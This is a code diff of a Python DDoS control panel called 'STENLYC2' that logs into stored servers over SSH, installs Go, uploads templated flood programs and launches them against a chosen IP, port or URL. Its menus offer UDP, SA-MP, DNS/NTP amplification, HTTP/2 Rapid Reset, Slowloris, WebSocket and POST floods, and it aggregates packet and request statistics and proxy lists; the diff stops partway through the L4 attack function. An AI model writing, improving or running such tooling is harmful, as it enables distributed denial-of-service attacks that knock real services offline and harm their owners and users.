@@ -5,99 +5,123 @@ import os
 import sys
 import json
 import time
-import paramiko
 import threading
 import subprocess
-from datetime import datetime
 import re
 import socket
 import select
 import random
 import urllib.parse
+from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ================= [ KONFIGURASI GLOBAL ] =================
+try:
+    import paramiko
+except ImportError:
+    print("[*] Installing paramiko...")
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko", "-q"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    import paramiko
+
 DB_FILE = "servers.json"
 PROXY_FILE = "proxy.txt"
-DEFAULT_KEY_FILE = os.path.expanduser("~/.ssh/id_rsa")
-VERSION = "30.0-HYBRID-L4L7"
+DEFAULT_KEY = os.path.expanduser("~/.ssh/id_rsa")
+VERSION = "30.0-STENLYC2-ULTIMATE"
 
-COLOR = {
-    'red': '\033[91m', 'green': '\033[92m', 'yellow': '\033[93m',
-    'blue': '\033[94m', 'purple': '\033[95m', 'cyan': '\033[96m',
-    'white': '\033[97m', 'reset': '\033[0m', 'bold': '\033[1m', 'dim': '\033[2m'
-}
+R = '\033[91m'
+G = '\033[92m'
+Y = '\033[93m'
+B = '\033[94m'
+P = '\033[95m'
+C = '\033[96m'
+W = '\033[97m'
+D = '\033[0m'
+BD = '\033[1m'
+DM = '\033[2m'
 
-# Method definitions
 L4_METHODS = {
     '1': ('UDP', 'Standard UDP Flood'),
-    '2': ('SAMP', 'SA-MP Query Flood (Variant 10000+)'),
+    '2': ('SAMP', 'SA-MP Query Flood'),
     '3': ('MIX', 'SAMP 80% + UDP 20%'),
     '4': ('AMPLIFY', 'DNS + NTP Amplification'),
     '5': ('GOD', 'ALL L4 METHODS COMBINED')
 }
 
 L7_METHODS = {
-    '1': ('HTTP_FLOOD', 'Standard HTTP GET Flood'),
-    '2': ('HTTP2_RAPID', 'HTTP/2 Rapid Reset (CVE-2023-44487)'),
-    '3': ('SLOWLORIS', 'Slowloris Partial Headers'),
+    '1': ('HTTP_FLOOD', 'HTTP GET Flood'),
+    '2': ('HTTP2_RAPID', 'HTTP/2 Rapid Reset'),
+    '3': ('SLOWLORIS', 'Slowloris Attack'),
     '4': ('WEBSOCKET', 'WebSocket Flood'),
-    '5': ('POST_FLOOD', 'HTTP POST Form Flood'),
+    '5': ('POST_FLOOD', 'HTTP POST Flood'),
     '6': ('GOD_L7', 'ALL L7 METHODS COMBINED')
 }
 
-# ================= [ DATABASE ] =================
-def load_servers():
-    """Load servers dengan backward compatibility L4 dan L7"""
+def load_db():
     if os.path.exists(DB_FILE):
         try:
             with open(DB_FILE, 'r') as f:
                 data = json.load(f)
-                # Ensure structure
                 defaults = {
-                    'stats': {
-                        "total_attacks": 0,
-                        "total_packets": 0,  # L4
-                        "total_requests": 0,  # L7
-                        "total_bytes": 0,
-                        "total_time": 0
-                    },
-                    'l7_stats': {
-                        "http_2xx": 0, "http_4xx": 0, "http_5xx": 0,
-                        "failed": 0, "avg_response_time": 0.0
-                    },
-                    'servers_password': [],
+                    'servers_pwd': [],
                     'servers_key': [],
                     'proxies': [],
-                    'attack_configs': {}
+                    'stats': {
+                        'attacks': 0,
+                        'packets': 0,
+                        'requests': 0,
+                        'bytes': 0,
+                        'time': 0,
+                        'success_rate': 0.0
+                    },
+                    'l7_stats': {
+                        'http_2xx': 0,
+                        'http_4xx': 0,
+                        'http_5xx': 0,
+                        'failed': 0,
+                        'avg_response_time': 0.0
+                    },
+                    'attack_history': []
                 }
                 for key, value in defaults.items():
                     if key not in data:
                         data[key] = value
                 return data
         except Exception as e:
-            print(f"{COLOR['red']}Error loading DB: {e}{COLOR['reset']}")
+            print(f"{R}[-] DB Error: {e}{D}")
     
     return {
-        "servers_password": [], "servers_key": [], "proxies": [],
-        "stats": {"total_attacks": 0, "total_packets": 0, "total_requests": 0, "total_bytes": 0, "total_time": 0},
-        "l7_stats": {"http_2xx": 0, "http_4xx": 0, "http_5xx": 0, "failed": 0, "avg_response_time": 0.0},
-        "attack_configs": {}
+        'servers_pwd': [],
+        'servers_key': [],
+        'proxies': [],
+        'stats': {
+            'attacks': 0,
+            'packets': 0,
+            'requests': 0,
+            'bytes': 0,
+            'time': 0,
+            'success_rate': 0.0
+        },
+        'l7_stats': {
+            'http_2xx': 0,
+            'http_4xx': 0,
+            'http_5xx': 0,
+            'failed': 0,
+            'avg_response_time': 0.0
+        },
+        'attack_history': []
     }
 
-def save_servers(data):
-    temp_file = DB_FILE + ".tmp"
+def save_db(data):
     try:
-        with open(temp_file, 'w') as f:
+        temp = DB_FILE + ".tmp"
+        with open(temp, 'w') as f:
             json.dump(data, f, indent=2)
-        os.replace(temp_file, DB_FILE)
+        os.replace(temp, DB_FILE)
     except Exception as e:
-        print(f"{COLOR['red']}Error saving DB: {e}{COLOR['reset']}")
+        print(f"{R}[-] Save Error: {e}{D}")
 
-# ================= [ SSH UTILITIES ] =================
-class SSHConnection:
-    def __init__(self, server):
-        self.server = server
+class SSH:
+    def __init__(self, srv):
+        self.srv = srv
         self.ssh = None
         self.sftp = None
         self.connected = False
@@ -107,32 +131,37 @@ class SSHConnection:
             self.ssh = paramiko.SSHClient()
             self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             
-            connect_args = {
-                'hostname': self.server['host'],
-                'port': self.server.get('port', 22),
-                'username': self.server['username'],
+            args = {
+                'hostname': self.srv['host'],
+                'port': self.srv.get('port', 22),
+                'username': self.srv['username'],
                 'timeout': timeout,
                 'allow_agent': False,
                 'look_for_keys': False,
                 'banner_timeout': 30
             }
             
-            if self.server.get('auth_type') == 'key':
-                key_file = self.server.get('key_file', DEFAULT_KEY_FILE)
+            if self.srv.get('auth_type') == 'key':
+                key_file = self.srv.get('key_file', DEFAULT_KEY)
                 if not os.path.exists(key_file):
-                    raise Exception(f"Key not found: {key_file}")
+                    return False
+                
                 try:
-                    pkey = paramiko.RSAKey.from_private_key_file(key_file)
+                    key = paramiko.RSAKey.from_private_key_file(key_file)
                 except:
                     try:
-                        pkey = paramiko.Ed25519Key.from_private_key_file(key_file)
+                        key = paramiko.Ed25519Key.from_private_key_file(key_file)
                     except:
-                        pkey = paramiko.ECDSAKey.from_private_key_file(key_file)
-                connect_args['pkey'] = pkey
+                        try:
+                            key = paramiko.ECDSAKey.from_private_key_file(key_file)
+                        except:
+                            return False
+                
+                args['pkey'] = key
             else:
-                connect_args['password'] = self.server['password']
+                args['password'] = self.srv['password']
             
-            self.ssh.connect(**connect_args)
+            self.ssh.connect(**args)
             self.sftp = self.ssh.open_sftp()
             self.connected = True
             return True
@@ -140,1025 +169,1134 @@ class SSHConnection:
             self.connected = False
             return False
     
-    def execute(self, command, timeout=60, get_pty=False):
+    def exe(self, cmd, timeout=60, pty=False):
         if not self.connected:
-            return "ERROR: Not connected"
+            return "ERROR: NOT_CONNECTED"
         try:
             stdin, stdout, stderr = self.ssh.exec_command(
-                command, timeout=timeout, get_pty=get_pty,
+                cmd, 
+                timeout=timeout, 
+                get_pty=pty,
                 environment={'PATH': '/usr/local/bin:/usr/bin:/bin:/usr/local/go/bin'}
             )
             return stdout.read().decode('utf-8', errors='ignore') + stderr.read().decode('utf-8', errors='ignore')
         except Exception as e:
             return f"ERROR: {str(e)}"
     
-    def upload_content(self, content, remote_path):
+    def upload(self, data, remote_path):
         if not self.connected:
             return False
         try:
             with self.sftp.file(remote_path, 'w') as f:
-                f.write(content)
+                f.write(data)
             return True
         except Exception as e:
             return False
     
     def close(self):
-        if self.sftp: self.sftp.close()
-        if self.ssh: self.ssh.close()
+        try:
+            if self.sftp:
+                self.sftp.close()
+            if self.ssh:
+                self.ssh.close()
+        except:
+            pass
         self.connected = False
 
-# ================= [ SERVER TESTING ] =================
-def test_server_l4(server):
-    """Test server untuk L4 attacks (attack.go)"""
-    print(f"{COLOR['yellow']}🔄 Testing {server['host']} (L4 Mode)...{COLOR['reset']}")
-    conn = SSHConnection(server)
-    if not conn.connect(timeout=10):
-        server['active'] = False
+def clear():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+def banner():
+    clear()
+    print(f'''{R}{BD}
+   _____ _             _            
+  / ____| |           | |           
+ | (___ | |_ ___ _ __ | | ___  _   _ 
+  \___ \| __/ _ \ '_ \| |/ _ \| | | |
+  ____) | ||  __/ | | | | (_) | |_| |
+ |_____/ \__\___|_| |_|_|\___/ \__, |
+                                __/ |
+                               |___/ {C}v30{D}
+{Y}        STENLYC2 - L4/L7 HYBRID{D}
+{DM}        Developer: Stenly | Termux Optimized{D}
+''')
+
+def fmt_num(n):
+    if n < 1000:
+        return str(int(n))
+    elif n < 1000000:
+        return f"{n/1000:.1f}K"
+    elif n < 1000000000:
+        return f"{n/1000000:.1f}M"
+    elif n < 1000000000000:
+        return f"{n/1000000000:.1f}G"
+    return f"{n/1000000000000:.1f}T"
+
+def parse_num(s):
+    s = str(s).strip().upper()
+    if s.endswith('K'):
+        return int(float(s[:-1]) * 1000)
+    elif s.endswith('M'):
+        return int(float(s[:-1]) * 1000000)
+    elif s.endswith('B'):
+        return int(float(s[:-1]) * 1000000000)
+    elif s.endswith('T'):
+        return int(float(s[:-1]) * 1000000000000)
+    return int(float(s))
+
+def test_l4(srv):
+    print(f"{Y}[*] Testing {srv['host']} (L4)...{D}")
+    c = SSH(srv)
+    if not c.connect(10):
+        print(f"{R}[-] {srv['host']} SSH Failed{D}")
+        srv['active'] = False
         return False
     
     try:
-        # Check basic resources
-        sys_check = """nproc 2>/dev/null || echo 1; free -m 2>/dev/null | grep Mem | awk '{print $2}' || echo 1024"""
-        result = conn.execute(sys_check)
-        lines = result.strip().split('\n')
-        server['cpu_cores'] = int(lines[0]) if lines[0].isdigit() else 2
-        server['ram_mb'] = int(lines[1]) if len(lines) > 1 and lines[1].isdigit() else 2048
+        info = c.exe("echo CPU:$(nproc 2>/dev/null || echo 1); echo RAM:$(free -m 2>/dev/null | awk '/Mem/{print $2}' || echo 1024); echo LOAD:$(uptime | awk -F'load average:' '{print $2}' || echo 0.00)")
         
-        # Check Go
-        go_check = """command -v go &> /dev/null && go version || echo "NOT_FOUND""""
-        result = conn.execute(go_check)
+        for line in info.split('\n'):
+            if line.startswith('CPU:'):
+                srv['cpu'] = int(line.split(':')[1])
+            elif line.startswith('RAM:'):
+                srv['ram'] = int(line.split(':')[1])
+            elif line.startswith('LOAD:'):
+                srv['load'] = line.split(':')[1].strip()
         
-        if "NOT_FOUND" in result:
-            # Install Go minimal (L4 tidak butuh modules)
-            install_cmd = """
-            cd /tmp && wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz && \
-            tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz && \
-            ln -sf /usr/local/go/bin/go /usr/local/bin/go && \
-            go version
-            """
-            result = conn.execute(install_cmd, timeout=120)
-            if "go version" not in result:
-                server['active'] = False
-                conn.close()
+        chk = c.exe("export PATH=$PATH:/usr/local/go/bin:/usr/local/bin; go version 2>/dev/null || echo NOTFOUND")
+        
+        if "NOTFOUND" in chk:
+            print(f"{Y}[!] Installing Go on {srv['host']}...{D}")
+            install_cmd = (
+                "cd /tmp && rm -f go.tar.gz && "
+                "wget -q --show-progress https://go.dev/dl/go1.21.0.linux-amd64.tar.gz -O go.tar.gz && "
+                "tar -C /usr/local -xzf go.tar.gz 2>/dev/null && "
+                "ln -sf /usr/local/go/bin/go /usr/local/bin/go 2>/dev/null; "
+                "export PATH=$PATH:/usr/local/go/bin; go version"
+            )
+            ins = c.exe(install_cmd, 120)
+            if "go version" not in ins:
+                print(f"{R}[-] Go install failed on {srv['host']}{D}")
+                c.close()
+                srv['active'] = False
                 return False
+            print(f"{G}[+] Go installed{D}")
         
-        # Network test
-        ping_test = "ping -c 2 8.8.8.8 2>/dev/null | tail -1 | awk -F '/' '{print $5}' || echo 999"
-        result = conn.execute(ping_test)
+        ping = c.exe("ping -c 1 8.8.8.8 2>/dev/null | grep time= | head -1 | awk -F'time=' '{print $2}' | awk '{print $1}' || echo 999")
         try:
-            server['latency'] = float(result.strip())
+            srv['ping'] = float(ping.strip())
         except:
-            server['latency'] = 999
+            srv['ping'] = 999
         
-        server['bandwidth'] = 100  # Default
-        server['active'] = True
-        server['l4_capable'] = True
-        print(f"{COLOR['green']}✅ L4 Ready | CPU:{server['cpu_cores']} | Latency:{server['latency']:.0f}ms{COLOR['reset']}")
-        conn.close()
+        srv['active'] = True
+        srv['l4'] = True
+        srv['bw'] = 100
+        
+        print(f"{G}[+] {srv['host']} Ready | CPU:{srv.get('cpu', '?')} | RAM:{srv.get('ram', '?')}MB | Ping:{srv['ping']:.0f}ms{D}")
+        c.close()
         return True
+        
     except Exception as e:
-        print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
-        server['active'] = False
-        conn.close()
+        print(f"{R}[-] Error on {srv['host']}: {str(e)[:50]}{D}")
+        srv['active'] = False
+        c.close()
         return False
 
-def test_server_l7(server):
-    """Test server untuk L7 attacks (attackl7.go) dengan module support"""
-    print(f"{COLOR['yellow']}🔄 Testing {server['host']} (L7 Mode)...{COLOR['reset']}")
-    conn = SSHConnection(server)
-    if not conn.connect(timeout=10):
-        server['active'] = False
+def test_l7(srv):
+    print(f"{Y}[*] Testing {srv['host']} (L7)...{D}")
+    c = SSH(srv)
+    if not c.connect(10):
+        print(f"{R}[-] {srv['host']} SSH Failed{D}")
+        srv['active'] = False
         return False
     
     try:
-        # System info
-        sys_check = """nproc 2>/dev/null || echo 1; free -m 2>/dev/null | grep Mem | awk '{print $2}' || echo 1024; uptime | awk -F'load average:' '{print $2}' || echo "0.00""""
-        result = conn.execute(sys_check)
-        lines = result.strip().split('\n')
-        server['cpu_cores'] = int(lines[0]) if lines[0].isdigit() else 2
-        server['ram_mb'] = int(lines[1]) if len(lines) > 1 and lines[1].isdigit() else 2048
+        info = c.exe("echo CPU:$(nproc 2>/dev/null || echo 1); echo RAM:$(free -m 2>/dev/null | awk '/Mem/{print $2}' || echo 1024)")
+        lines = info.strip().split('\n')
+        try:
+            srv['cpu'] = int(lines[0].split(':')[1])
+            srv['ram'] = int(lines[1].split(':')[1])
+        except:
+            srv['cpu'] = 2
+            srv['ram'] = 1024
         
-        # Check Go dengan modules
-        go_check = """export PATH=$PATH:/usr/local/go/bin; go version 2>/dev/null || echo "NOT_FOUND""""
-        result = conn.execute(go_check)
+        chk = c.exe("export PATH=$PATH:/usr/local/go/bin:/usr/local/bin; go version 2>/dev/null || echo NOTFOUND")
         
-        if "NOT_FOUND" in result:
-            # Install Go
-            install_cmd = """
-            export DEBIAN_FRONTEND=noninteractive
-            cd /tmp && rm -rf go* /usr/local/go
-            wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz -O go.tar.gz
-            tar -C /usr/local -xzf go.tar.gz
-            ln -sf /usr/local/go/bin/go /usr/local/bin/go 2>/dev/null || true
-            echo 'export PATH=$PATH:/usr/local/go/bin' > /etc/profile.d/go.sh
-            go version
-            """
-            result = conn.execute(install_cmd, timeout=120)
-            if "go version" not in result:
-                server['active'] = False
-                conn.close()
+        if "NOTFOUND" in chk:
+            print(f"{Y}[!] Installing Go...{D}")
+            ins = c.exe(
+                "cd /tmp && wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz -O go.tar.gz && "
+                "tar -C /usr/local -xzf go.tar.gz && "
+                "ln -sf /usr/local/go/bin/go /usr/local/bin/go 2>/dev/null; "
+                "export PATH=$PATH:/usr/local/go/bin; go version", 120
+            )
+            if "go version" not in ins:
+                print(f"{R}[-] Go install failed{D}")
+                c.close()
+                srv['active'] = False
                 return False
         
-        # Setup Go modules untuk L7 (http2, websocket, proxy)
-        print(f"{COLOR['cyan']}📦 Setting up L7 modules...{COLOR['reset']}")
-        mod_cmd = """
-        export PATH=$PATH:/usr/local/go/bin
-        export GOPROXY=https://proxy.golang.org,direct
-        mkdir -p /tmp/gomod && cd /tmp/gomod
-        go mod init test 2>/dev/null || true
-        go get golang.org/x/net/http2@latest 2>&1 | tail -1
-        go get github.com/gorilla/websocket@latest 2>&1 | tail -1
-        rm -rf /tmp/gomod
-        echo "MODULES_OK"
-        """
-        result = conn.execute(mod_cmd, timeout=60)
+        print(f"{C}[*] Installing L7 modules on {srv['host']}...{D}")
+        mod = c.exe(
+            "export PATH=$PATH:/usr/local/go/bin && "
+            "export GOPROXY=https://proxy.golang.org,direct && "
+            "export GO111MODULE=on && "
+            "mkdir -p /tmp/gomod && cd /tmp/gomod && "
+            "go mod init temp 2>/dev/null || true && "
+            "go get golang.org/x/net/http2@latest 2>&1 | tail -1 && "
+            "go get golang.org/x/net/proxy@latest 2>&1 | tail -1 && "
+            "go get github.com/gorilla/websocket@latest 2>&1 | tail -1 && "
+            "cd / && rm -rf /tmp/gomod && echo MODULES_OK", 90
+        )
         
-        # Network test
-        ping_test = "ping -c 2 8.8.8.8 2>/dev/null | tail -1 | awk -F '/' '{print $5}' || echo 999"
-        result = conn.execute(ping_test)
-        try:
-            server['latency'] = float(result.strip())
-        except:
-            server['latency'] = 999
+        if "MODULES_OK" not in mod:
+            print(f"{Y}[!] Module warning on {srv['host']}{D}")
         
-        server['bandwidth'] = 100
-        server['active'] = True
-        server['l7_capable'] = True
-        print(f"{COLOR['green']}✅ L7 Ready | CPU:{server['cpu_cores']} | Modules: OK{COLOR['reset']}")
-        conn.close()
+        srv['active'] = True
+        srv['l7'] = True
+        srv['bw'] = 100
+        
+        print(f"{G}[+] {srv['host']} L7 Ready | CPU:{srv['cpu']}{D}")
+        c.close()
         return True
+        
     except Exception as e:
-        print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
-        server['active'] = False
-        conn.close()
+        print(f"{R}[-] Error: {str(e)[:50]}{D}")
+        srv['active'] = False
+        c.close()
         return False
 
-# ================= [ SCRIPT GENERATORS ] =================
-def generate_l4_script(target_ip, target_port, duration, method, threads):
-    """Generate L4 script dari attack.go (UDP/SAMP)"""
+def gen_l4(ip, port, duration, method, threads):
     try:
         with open('attack.go', 'r') as f:
             template = f.read()
         
-        script = template.replace('{{.TargetIP}}', target_ip)
-        script = script.replace('{{.TargetPort}}', str(target_port))
+        script = template.replace('{{.TargetIP}}', ip)
+        script = script.replace('{{.TargetPort}}', str(port))
         script = script.replace('{{.Duration}}', str(duration))
         script = script.replace('{{.Threads}}', str(threads))
-        script = script.replace('{{.Method}}', method.upper())
+        script = script.replace('{{.Method}}', method)
         return script
     except FileNotFoundError:
-        print(f"{COLOR['red']}❌ attack.go not found!{COLOR['reset']}")
+        print(f"{R}[-] attack.go not found!{D}")
         return None
     except Exception as e:
-        print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
+        print(f"{R}[-] Template error: {e}{D}")
         return None
 
-def generate_l7_script(target_url, duration, threads, method):
-    """Generate L7 script dari attackl7.go (HTTP/WebSocket)"""
+def gen_l7(url, duration, method, threads):
     try:
         with open('attackl7.go', 'r') as f:
             template = f.read()
         
-        script = template.replace('{{.TargetURL}}', target_url)
+        script = template.replace('{{.TargetURL}}', url)
         script = script.replace('{{.Duration}}', str(duration))
         script = script.replace('{{.Threads}}', str(threads))
-        script = script.replace('{{.Method}}', method.upper())
+        script = script.replace('{{.Method}}', method)
         return script
     except FileNotFoundError:
-        print(f"{COLOR['red']}❌ attackl7.go not found!{COLOR['reset']}")
+        print(f"{R}[-] attackl7.go not found!{D}")
         return None
     except Exception as e:
-        print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
+        print(f"{R}[-] Template error: {e}{D}")
         return None
 
-# ================= [ DEPLOY ATTACK L4 ] =================
-def deploy_attack_l4(servers, target_ip, target_port, duration, method, threads, data):
-    """Deploy L4 attack (attack.go) - ORIGINAL CODE PRESERVED"""
-    print(f"\n{COLOR['cyan']}{COLOR['bold']}⚔️ DEPLOYING L4 ATTACK TO {len(servers)} SERVERS{COLOR['reset']}")
-    print(f"🎯 Target: {target_ip}:{target_port}")
-    print(f"⏱️ Duration: {duration}s | Method: {method}")
-    print(f"⚡ Threads/server: {threads}")
+def attack_l4(servers, ip, port, duration, method, threads, data):
+    print(f"\n{BD}{R}>> L4 ATTACK DEPLOYMENT <<{D}")
+    print(f"{C}Target: {ip}:{port}{D}")
+    print(f"{C}Method: {method} | Duration: {duration}s | Threads/Srv: {threads}{D}")
+    print(f"{C}Servers: {len(servers)}{D}\n")
     
-    go_script = generate_l4_script(target_ip, target_port, duration, method, threads)
-    if not go_script:
+    script = gen_l4(ip, port, duration, method, threads)
+    if not script:
+        input(f"\n{R}Press Enter...{D}")
         return
     
-    results = {'total_packets': 0, 'total_bytes': 0, 'success': 0, 'failed': 0}
-    start_time = time.time()
+    results = {
+        'packets': 0,
+        'bytes': 0,
+        'ok': 0,
+        'fail': 0,
+        'details': []
+    }
     
-    def attack_server(server, index):
-        conn = SSHConnection(server)
-        if not conn.connect(timeout=10):
-            results['failed'] += 1
-            print(f"{COLOR['red']}❌ [{index+1}] {server['host']} - Connection failed{COLOR['reset']}")
+    lock = threading.Lock()
+    start = time.time()
+    
+    def run(srv, idx):
+        c = SSH(srv)
+        if not c.connect(15):
+            with lock:
+                results['fail'] += 1
+            print(f"{R}[{idx}] {srv['host']} - Connection Failed{D}")
             return
         
         try:
-            # Setup dan compile
-            cmd = f"""
-            mkdir -p /tmp/goattack && cd /tmp/goattack
-            cat > attack.go << 'EOF'
-{go_script}
-EOF
-            export PATH=$PATH:/usr/local/go/bin
-            go build -ldflags="-s -w" -o attack attack.go 2>&1
-            if [ -f attack ]; then
-                chmod +x attack
-                nice -n -20 ./attack
-                rm -f attack attack.go
-                echo "COMPLETED"
-            else
-                echo "BUILD_FAIL"
-            fi
-            """
+            setup = (
+                "mkdir -p /tmp/l4attack && cd /tmp/l4attack && "
+                "rm -f attack.go attack 2>/dev/null"
+            )
+            c.exe(setup)
             
-            output = conn.execute(cmd, timeout=duration+60, get_pty=True)
+            c.upload(script, '/tmp/l4attack/attack.go')
             
-            # Parse hasil
-            packets = 0
-            bytes_total = 0
+            compile_cmd = (
+                "export PATH=$PATH:/usr/local/go/bin:/usr/local/bin; "
+                "cd /tmp/l4attack && "
+                "go build -ldflags='-s -w' -o attack attack.go 2>&1; "
+                "echo BUILD_EXIT:$?"
+            )
+            comp = c.exe(compile_cmd, 60)
             
-            match = re.search(r'📦 TOTAL PACKETS:\s+([\d.]+[KMBT]?)', output)
-            if match:
-                packets = parse_number(match.group(1))
-                results['total_packets'] += packets
-            
-            match = re.search(r'📊 TOTAL DATA:\s+([\d.]+)\s+MB', output)
-            if match:
-                bytes_total = float(match.group(1)) * 1024 * 1024
-                results['total_bytes'] += int(bytes_total)
-            
-            if packets > 0:
-                results['success'] += 1
-                print(f"{COLOR['green']}✅ [{index+1}] {server['host']} | Packets: {format_number(packets)}{COLOR['reset']}")
-            else:
-                results['failed'] += 1
-                print(f"{COLOR['red']}❌ [{index+1}] {server['host']} | Failed{COLOR['reset']}")
-                
-        except Exception as e:
-            results['failed'] += 1
-            print(f"{COLOR['red']}❌ [{index+1}] {server['host']} | Error: {str(e)[:50]}{COLOR['reset']}")
-        finally:
-            conn.execute("rm -rf /tmp/goattack")
-            conn.close()
-    
-    # Launch threads
-    threads_list = []
-    for i, server in enumerate(servers):
-        t = threading.Thread(target=attack_server, args=(server, i))
-        t.start()
-        threads_list.append(t)
-        time.sleep(0.2)
-    
-    # Progress
-    start_wait = time.time()
-    while any(t.is_alive() for t in threads_list):
-        elapsed = time.time() - start_wait
-        done = len([t for t in threads_list if not t.is_alive()])
-        if elapsed < duration:
-            sys.stdout.write(f"\r⏳ Progress: {done}/{len(servers)} servers | {elapsed:.0f}s/{duration}s")
-            sys.stdout.flush()
-        time.sleep(1)
-    
-    for t in threads_list:
-        t.join()
-    
-    total_time = time.time() - start_time
-    
-    # Update stats
-    data['stats']['total_attacks'] += 1
-    data['stats']['total_packets'] += results['total_packets']
-    data['stats']['total_bytes'] += results['total_bytes']
-    data['stats']['total_time'] += total_time
-    save_servers(data)
-    
-    # Report
-    avg_pps = results['total_packets'] // duration if duration > 0 else 0
-    avg_gbps = (results['total_bytes'] * 8) / (duration * 1024**3) if duration > 0 else 0
-    
-    print(f"\n\n{COLOR['cyan']}{COLOR['bold']}╔══════════════════════════════════════════════════════════════════╗{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║                     L4 ATTACK STATISTICS                         ║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}╠══════════════════════════════════════════════════════════════════╣{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║  🎯 Target: {target_ip}:{target_port}{' '*40}║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║  📦 Packets: {format_number(results['total_packets']):>30}                  ║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║  📊 Data: {results['total_bytes']/1024/1024/1024:>10.2f} GB                              ║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║  ⚡ Avg PPS: {format_number(avg_pps):>30}                  ║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}║  🌐 Avg GBPS: {avg_gbps:>30.2f}                  ║{COLOR['reset']}")
-    print(f"{COLOR['cyan']}{COLOR['bold']}╚══════════════════════════════════════════════════════════════════╝{COLOR['reset']}")
-
-# ================= [ DEPLOY ATTACK L7 ] =================
-def deploy_attack_l7(servers, target_url, duration, method, threads, data):
-    """Deploy L7 attack (attackl7.go)"""
-    print(f"\n{COLOR['cyan']}{COLOR['bold']}⚔️ DEPLOYING L7 ATTACK TO {len(servers)} SERVERS{COLOR['reset']}")
-    print(f"🎯 Target: {target_url}")
-    print(f"⏱️ Duration: {duration}s | Method: {method}")
-    print(f"⚡ Threads/server: {threads}")
-    
-    go_script = generate_l7_script(target_url, duration, threads, method)
-    if not go_script:
-        return
-    
-    # Upload proxies jika ada
-    proxy_content = ""
-    active_proxies = [p['url'] for p in data.get('proxies', []) if p.get('active')]
-    if active_proxies:
-        proxy_content = '\n'.join(active_proxies[:500])
-    
-    results = {'total_requests': 0, 'total_bytes': 0, 'success': 0, 'failed': 0}
-    start_time = time.time()
-    
-    def attack_server(server, index):
-        conn = SSHConnection(server)
-        if not conn.connect(timeout=15):
-            results['failed'] += 1
-            return
-        
-        try:
-            # Setup workspace
-            conn.execute("mkdir -p /tmp/l7attack && rm -f /tmp/l7attack/*")
-            
-            if proxy_content:
-                conn.upload_content(proxy_content, '/tmp/l7attack/proxy.txt')
-            
-            conn.upload_content(go_script, '/tmp/l7attack/attack.go')
-            
-            # Prepare modules
-            prep_cmd = """
-            cd /tmp/l7attack
-            export PATH=$PATH:/usr/local/go/bin
-            export GOPROXY=https://proxy.golang.org,direct
-            go mod init attack 2>/dev/null || true
-            go get golang.org/x/net/http2@latest 2>&1 | tail -1
-            go get golang.org/x/net/proxy@latest 2>&1 | tail -1
-            go get github.com/gorilla/websocket@latest 2>&1 | tail -1
-            """
-            conn.execute(prep_cmd, timeout=60)
-            
-            # Compile
-            comp_cmd = """
-            cd /tmp/l7attack
-            export PATH=$PATH:/usr/local/go/bin
-            go build -ldflags="-s -w" -o attack attack.go 2>&1
-            echo "BUILD:$?"
-            """
-            comp_result = conn.execute(comp_cmd, timeout=60)
-            
-            if "BUILD:0" not in comp_result:
-                results['failed'] += 1
-                print(f"{COLOR['red']}❌ [{index+1}] {server['host']} - Build failed{COLOR['reset']}")
-                conn.close()
+            if "BUILD_EXIT:0" not in comp:
+                with lock:
+                    results['fail'] += 1
+                print(f"{R}[{idx}] {srv['host']} - Build Failed{D}")
+                c.exe("rm -rf /tmp/l4attack")
+                c.close()
                 return
             
-            # Run
-            run_cmd = """
-            cd /tmp/l7attack
-            export PATH=$PATH:/usr/local/go/bin
-            ulimit -n 65535 2>/dev/null || true
-            nice -n -20 ./attack 2>&1
-            echo "ATTACK_COMPLETE"
-            """
-            output = conn.execute(run_cmd, timeout=duration+30, get_pty=True)
+            run_cmd = (
+                "export PATH=$PATH:/usr/local/go/bin; "
+                "cd /tmp/l4attack && "
+                "ulimit -n 65535 2>/dev/null; "
+                "nice -n -20 ./attack 2>&1"
+            )
+            out = c.exe(run_cmd, duration + 30, True)
             
-            # Parse
-            requests = 0
-            bytes_total = 0
+            c.exe("rm -rf /tmp/l4attack")
+            c.close()
             
-            match = re.search(r'📦 TOTAL REQUESTS:\s+([\d.]+[KMBT]?)', output)
-            if match:
-                requests = parse_number(match.group(1))
-                results['total_requests'] += requests
+            pkt = 0
+            byt = 0
+            pps = 0
             
-            match = re.search(r'📊 TOTAL DATA:\s+([\d.]+)\s+MB', output)
-            if match:
-                bytes_total = float(match.group(1)) * 1024 * 1024
-                results['total_bytes'] += int(bytes_total)
+            m = re.search(r'TOTAL PACKETS:\s+([\d.]+[KMBT]?)', out)
+            if m:
+                pkt = parse_num(m.group(1))
             
-            if requests > 0:
-                results['success'] += 1
-                print(f"{COLOR['green']}✅ [{index+1}] {server['host']} | Requests: {format_number(requests)}{COLOR['reset']}")
+            m = re.search(r'TOTAL DATA:\s+([\d.]+)\s+MB', out)
+            if m:
+                byt = float(m.group(1)) * 1024 * 1024
+            
+            m = re.search(r'AVERAGE PPS:\s+([\d.]+[KMBT]?)', out)
+            if m:
+                pps = parse_num(m.group(1))
+            
+            with lock:
+                results['packets'] += pkt
+                results['bytes'] += byt
+            
+            if pkt > 0:
+                with lock:
+                    results['ok'] += 1
+                print(f"{G}[{idx}] {srv['host']} | Packets: {fmt_num(pkt)} | PPS: {fmt_num(pps)}{D}")
+                results['details'].append({
+                    'host': srv['host'],
+                    'packets': pkt,
+                    'bytes': byt,
+                    'status': 'success'
+                })
             else:
-                results['failed'] += 1
